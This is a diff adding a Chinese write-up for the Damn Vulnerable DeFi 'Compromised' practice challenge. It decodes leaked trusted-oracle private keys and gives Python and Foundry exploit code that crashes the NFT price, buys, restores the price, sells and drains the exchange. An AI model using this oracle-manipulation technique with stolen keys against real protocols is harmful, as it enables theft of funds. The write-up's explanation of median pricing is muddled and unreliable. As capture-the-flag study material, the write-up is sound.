@@ -1461,8 +1461,94 @@ contract Hack is IERC3156FlashBorrower {
 
 - [DamnVulnerableDeFi-06-Selfie.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-06-Selfie.t.sol)
 
+### 2024.09.21
 
 #### [DamnVulnerableDeFi-07] Compromised
+
+- 過關條件: 把 `Exchange` 合約的 ETH 轉走放到 `recovery` 帳號，並且 NFT 的價格仍然維持在 999 ETH 不變
+- 解題分析:
+  - 這一題提供了一個怪怪的 HTTP 封包內容
+  - 很明顯是 Hex Encode 過的東西
+  - 不知道這包 HTTP 是啥，先看合約代碼
+  - 從合約名稱可以看到 `TrustfulOracle`，猜測可能是 Price Manipulation Attack
+    - 也許是先把價格拉到超低，以 0.1 ETH 購入 NFT
+    - 買入後，再把 NFT 價格拉到超高，賣給 `Exchange`，把 `Exchange` 的 ETH 全部捲走
+    - 然後再把價格定錨回到 999 ETH 之類的
+  - 要這樣做，只能操縱 `oracle.getMedianPrice(token.symbol())` 的返回值了
+  - `oracle.getMedianPrice()` 的實施方式大概是這樣:
+    - 此例為 ``
+    - 取 `N` 個價格插槽，假設 `N` 為 4，`N` 此時是個雙數 (N 從 0 開始算)
+    - 假設價格插槽裡面放了 `[1, 3, 6, 10, 7]`
+    - 取中間值與前一個值的平均值作為返回值
+    - 此例為第 2 與第 3 個元素，所以是 `6` 與 `10`
+    - `6 + 10 / 2 = 8`，返回中位價格 `8`
+    - 再看一例
+    - 取 `N` 個價格插槽，假設 `N` 為 3，`N` 此時是個單數 (N 從 0 開始算)
+    - 假設價格插槽裡面放了 `[1, 3, 6, 10]`
+    - 取第 `length / 2` 個元素作為返回值
+    - 此例為第 1 個元素，所以返回 `3`
+  - 那麼題目有幾個插槽呢? 題目有 [3 個價格插槽](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/test/compromised/Compromised.t.sol#L30)
+  - 3 個價格插槽的數值都一樣是 999 ETH，所以中位數價格也會是 999 ETH
+  - 誰可以操縱價格呢? 操縱價格的人限定是需要持有 `TRUSTED_SOURCE_ROLE` 的錢包地址
+  - 有這個 ROLE 的錢包地址只有這[三個 sources](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/test/compromised/Compromised.t.sol#L24)
+  - 所以看起來我們的 `player` 帳號也沒辦法操縱價格
+  - 考量到題目名稱叫做 Compromised，應該是要找三個 sources 的 private key
+  - 一開始想到 `anvil` 裡面的 private key，但沒有匹配
+  - 回頭想到題目頁面提供了一個 HTTP 封包，也許 Private Key 就在裡面
+  - 第一段 Hex 解碼之後會得到 `ASCII("MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0")`
+  - 第二段 Hex 解碼之後會得到 `ASCII("MHg2OGJkMDIwYWQxODZiNjQ3YTY5MWM2YTVjMGMxNTI5ZjIxZWNkMDlkY2M0NTI0MTQwMmFjNjBiYTM3N2M0MTU5")`
+  - 這東西看起來有點像是 Base64 的格式，再拿去做 b64decode
+  - 第一段得到 `0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744`
+  - 第二段得到 `0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159`
+  - 這串長度剛好符合 private key 要求的 64 個 hex 字符
+  - 可以直接匯入 metamask 或是 python 腳本，看看他對應的錢包地址是什麼 (見下方範例代碼)
+  - 結果這兩組 Decode 出來的結果，剛好就是其中兩個 sources 的 private key
+  - 所以接下來的思路就很明確了: **用 trusted sources 的帳號，去 `postPrice()` 操縱 NFT 的價格**
+  - 阿因為既然我們都有兩隻 trusted sources 的私鑰了，我接下來用 foundry 作弊碼直接模擬這兩隻帳號的動作來過關...
+  - 
+
+```python=
+from eth_account import Account
+
+magic_decode_output_1 = "0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744"
+magic_decode_output_2 = "0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159"
+
+private_key_1 = Account.from_key(magic_decode_output_1)
+private_key_2 = Account.from_key(magic_decode_output_2)
+
+wallet_address_1 = private_key_1.address
+wallet_address_2 = private_key_2.address
+
+print(f"Ethereum Address 1: {wallet_address_1}")
+print(f"Ethereum Address 2: {wallet_address_2}")
+```
+
+```solidity=
+function test_compromised() public checkSolved {
+    vm.prank(0x188Ea627E3531Db590e6f1D71ED83628d1933088);
+    oracle.postPrice("DVNFT", 0);
+
+    vm.prank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8);
+    oracle.postPrice("DVNFT", 0);
+
+    vm.prank(player);
+    exchange.buyOne{value: 1}();
+
+
+    vm.prank(0x188Ea627E3531Db590e6f1D71ED83628d1933088);
+    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+    vm.prank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8);
+    oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+    vm.startPrank(player);
+    nft.approve(address(exchange), 0);
+    exchange.sellOne(0);
+    payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+}
+```
+
+- [DamnVulnerableDeFi-07-Compromised.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-07-Compromised.t.sol)
 
 
 <!-- Content_END -->
